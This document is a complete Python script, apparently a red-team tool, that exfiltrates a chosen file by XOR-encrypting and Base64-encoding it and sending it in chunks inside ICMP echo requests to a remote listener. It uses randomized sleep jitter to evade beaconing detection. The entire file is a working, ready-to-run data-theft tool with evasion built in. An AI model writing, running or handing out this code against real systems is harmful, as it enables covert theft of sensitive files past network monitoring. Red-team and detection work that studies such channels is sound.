#!/usr/bin/env python3
"""
L3 Covert Channel Framework (ICMP Data Exfiltration).
Reads a sensitive file, applies single-byte XOR encryption, 
encodes to Base64, and exfiltrates via ICMP Echo Requests.
Includes Beaconing Evasion (randomized sleep jitter).

Author: 18ilya99
Role: Security Researcher / Red Team Engineer
"""

import argparse
import base64
import random
import time
import sys
from scapy.all import IP, ICMP, Raw, send

def xor_encrypt(data: bytes, key: int) -> bytes:
    """Encrypts byte data using a single-byte XOR key."""
    return bytearray([b ^ key for b in data])

def chunk_data(data: str, chunk_size: int):
    """Yields consecutive chunks of data."""
    for i in range(0, len(data), chunk_size):
        yield data[i:i + chunk_size]

def exfiltrate(target_ip: str, file_path: str, xor_key: int, chunk_size: int = 32):
    """
    Reads the file, encrypts, encodes, and sends it over ICMP.
    Uses randomized delays to evade time-based detection (Beaconing).
    """
    try:
        with open(file_path, "rb") as f:
            raw_data = f.read()
    except FileNotFoundError:
        print(f"[-] Error: File '{file_path}' not found.")
        sys.exit(1)
    except PermissionError:
        print(f"[-] Error: Permission denied to read '{file_path}'.")
        sys.exit(1)

    print(f"[*] Reading '{file_path}' ({len(raw_data)} bytes)...")
    
    # 1. Obfuscation: XOR Encryption
    encrypted_data = xor_encrypt(raw_data, xor_key)
    
    # 2. Obfuscation: Base64 Encoding (to ensure safe transport in ICMP payload)
    encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
    print(f"[*] Data encrypted and encoded. Total payload size: {len(encoded_data)} bytes.")
    print(f"[*] Starting exfiltration to {target_ip}...\n")

    chunks = list(chunk_data(encoded_data, chunk_size))
    
    # Add a specific ICMP ID so our Blue Team parser knows it's our C2 traffic
    icmp_id = 1337

    for index, chunk in enumerate(chunks):
        # Craft L3/L4 packet: IP -> ICMP -> Raw Payload
        pkt = IP(dst=target_ip) / ICMP(type=8, id=icmp_id) / Raw(load=chunk)
        send(pkt, verbose=False)
        
        print(f"[+] Sent chunk {index + 1}/{len(chunks)}: {chunk}")
        
        # 3. Evasion: Jitter (Random sleep between 0.1 and 0.5 seconds)
        jitter = random.uniform(0.1, 0.5)
        time.sleep(jitter)

    # Send a final 'EOF' packet to signal the end of transmission
    eof_pkt = IP(dst=target_ip) / ICMP(type=8, id=icmp_id) / Raw(load="EOF")
    send(eof_pkt, verbose=False)
    print("\n[+] Exfiltration complete.")

def main():
    parser = argparse.ArgumentParser(description="ICMP Covert Channel Data Exfiltration Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP address (Listener)")
    parser.add_argument("-f", "--file", required=True, help="Path to the file to exfiltrate")
    parser.add_argument("-k", "--key", type=int, default=42, help="Single-byte XOR key (0-255), default: 42")
    
    args = parser.parse_args()

    # Validate XOR key
    if not (0 <= args.key <= 255):
        print("[-] Error: XOR key must be between 0 and 255.")
        sys.exit(1)

    exfiltrate(args.target, args.file, args.key)

if __name__ == "__main__":
    main()